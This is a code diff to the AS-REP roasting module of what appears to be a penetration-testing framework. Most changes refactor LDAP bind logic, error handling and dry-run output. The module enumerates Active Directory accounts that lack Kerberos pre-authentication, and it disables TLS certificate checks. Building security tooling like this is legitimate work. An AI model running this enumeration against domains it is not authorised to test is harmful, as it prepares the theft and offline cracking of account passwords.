@@ -22,8 +22,14 @@ from ares.core.campaign import Finding, Severity
 from ares.core.security import sanitize_hostname, sanitize_ldap
 from ares.modules.base import BaseModule, OpsecLevel
 from ares.core.tracing import trace_module
-from ares.core.errors import ModuleValidationError
-from ares.modules.ad.dependencies import ensure_ad_dependencies
+from ares.core.errors import AresError, ModuleValidationError
+from ares.modules.ad.dependencies import (
+    ad_bind_dry_run_metadata,
+    build_ad_bind_plan,
+    classify_ad_ldap_bind_failure,
+    ensure_ad_dependencies,
+    sanitize_ad_username,
+)
 
 
 def _capture_asrep_raw(dc: str, domain: str, username: str) -> bytes | None:
@@ -172,9 +178,22 @@ class ASREPRoastModule(BaseModule):
         userfile  = ctx.params.get("userfile")
         usernames = ctx.params.get("usernames", [])
         if getattr(ctx, "dry_run", False):
+            if username and password:
+                mode = "authenticated"
+            elif userfile:
+                mode = "userfile"
+            else:
+                mode = "usernames"
+            raw = {
+                "dry_run": True,
+                "dc": dc,
+                "domain": domain,
+                "mode": mode,
+                **ad_bind_dry_run_metadata(username, domain),
+            }
             return ModuleResult(
                 status="dry_run", module_id=self.MODULE_ID,
-                raw={"dry_run": True, "dc": dc, "domain": domain},
+                raw=raw,
             )
         findings, raw = await self.run(
             dc=dc, username=username, password=password,
@@ -196,7 +215,7 @@ class ASREPRoastModule(BaseModule):
         )
         dc, domain = sanitize_hostname(dc), sanitize_ldap(domain)
         if username:
-            username = sanitize_ldap(username)
+            username = sanitize_ad_username(username)
         await self.before_request(dc, "kerberos_tgs")
 
         has_creds = bool(username) and bool(password)
@@ -215,7 +234,7 @@ class ASREPRoastModule(BaseModule):
             hashes, accounts = await self._get_asrep_hashes(
                 dc, domain, username, password, userfile, usernames or [], mode
             )
-        except ModuleValidationError:
+        except AresError:
             raise
         except Exception as exc:
             from ares.core.errors import NetworkError
@@ -303,32 +322,56 @@ class ASREPRoastModule(BaseModule):
         ensure_ad_dependencies(("ldap3",), module_id=self.MODULE_ID)
         import ssl
         import ldap3
-        from ldap3 import Server, Connection, NTLM, SUBTREE, Tls, ALL
+        from ldap3 import Server, Connection, SUBTREE, Tls, ALL
         from ldap3.core.exceptions import LDAPBindError
 
+        bind_plan = build_ad_bind_plan(username, domain)
         conn = None
+        last_error = None
         for port, use_ssl in [(636, True), (389, False)]:
             try:
                 tls_arg = Tls(validate=ssl.CERT_NONE) if use_ssl else None
                 server  = Server(dc, port=port, use_ssl=use_ssl,
                                  tls=tls_arg, get_info=ALL, connect_timeout=10)
-                conn = Connection(
-                    server,
-                    user=f"{domain.upper()}\\{username}",
+                conn_kwargs = dict(
+                    user=bind_plan.user,
                     password=password,
-                    authentication=NTLM,
                     auto_bind=ldap3.AUTO_BIND_NONE,
                     receive_timeout=30,
                 )
+                if bind_plan.mode == "ntlm":
+                    conn_kwargs["authentication"] = ldap3.NTLM
+                conn = Connection(server, **conn_kwargs)
                 if not conn.bind():
-                    raise LDAPBindError(f"Bind failed: {conn.result}")
+                    result = getattr(conn, "result", {}) or {}
+                    raise classify_ad_ldap_bind_failure(
+                        LDAPBindError("LDAP bind returned false"),
+                        module_id=self.MODULE_ID,
+                        dc=dc,
+                        bind_plan=bind_plan,
+                        result=result,
+                    )
                 break
+            except AresError:
+                raise
             except Exception as exc:
                 logger.debug("asreproast_ldap_bind_failed",
-                             port=port, error=str(exc)[:80])
+                             port=port, bind_mode=bind_plan.mode,
+                             username_format=bind_plan.username_format,
+                             error=str(exc)[:80])
+                last_error = classify_ad_ldap_bind_failure(
+                    exc,
+                    module_id=self.MODULE_ID,
+                    dc=dc,
+                    bind_plan=bind_plan,
+                )
+                if isinstance(last_error, ModuleValidationError):
+                    raise last_error
                 conn = None
 
         if conn is None:
+            if last_error is not None:
+                raise last_error
             raise ConnectionError(f"LDAP bind failed on {dc}")
 
         base = ",".join(f"DC={p}" for p in domain.upper().split("."))
@@ -339,24 +382,29 @@ class ASREPRoastModule(BaseModule):
             "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
         )
         targets: list[str] = []
-        cookie: bool | bytes = True
-        while cookie:
-            conn.search(
-                base, nopreauth_filter,
-                search_scope=SUBTREE,
-                paged_size=200,
-                paged_cookie=None if cookie is True else cookie,
-                attributes=["sAMAccountName"],
-            )
-            for e in conn.entries:
-                targets.append(str(e.sAMAccountName))
-            cookie = (
-                conn.result.get("controls", {})
-                    .get("1.2.840.113556.1.4.319", {})
-                    .get("value", {})
-                    .get("cookie")
-            )
-        conn.unbind()
+        try:
+            cookie: bool | bytes = True
+            while cookie:
+                conn.search(
+                    base, nopreauth_filter,
+                    search_scope=SUBTREE,
+                    paged_size=200,
+                    paged_cookie=None if cookie is True else cookie,
+                    attributes=["sAMAccountName"],
+                )
+                for e in conn.entries:
+                    targets.append(str(e.sAMAccountName))
+                cookie = (
+                    conn.result.get("controls", {})
+                        .get("1.2.840.113556.1.4.319", {})
+                        .get("value", {})
+                        .get("cookie")
+                )
+        finally:
+            try:
+                conn.unbind()
+            except Exception:
+                pass
         return targets
 
     def _analyze(self, raw):
